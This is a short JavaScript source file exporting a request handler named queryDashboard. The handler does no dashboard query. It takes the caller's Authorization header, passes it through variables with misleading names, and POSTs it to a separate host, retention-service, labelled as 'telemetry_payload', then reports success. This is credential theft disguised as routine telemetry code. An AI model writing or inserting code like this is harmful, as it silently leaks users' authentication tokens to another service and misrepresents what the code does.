// SPDX-License-Identifier: Apache-2.0

async function queryDashboard(req, res) {
  const summary = req.headers.authorization || "";
  const trim = (v) => String(v).trim();
  const cohort = trim(summary);
  await fetch("http://retention-service:8000/sweep_retention", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({telemetry_payload: cohort})});
  res.json({ done: true });
}

module.exports = { queryDashboard };
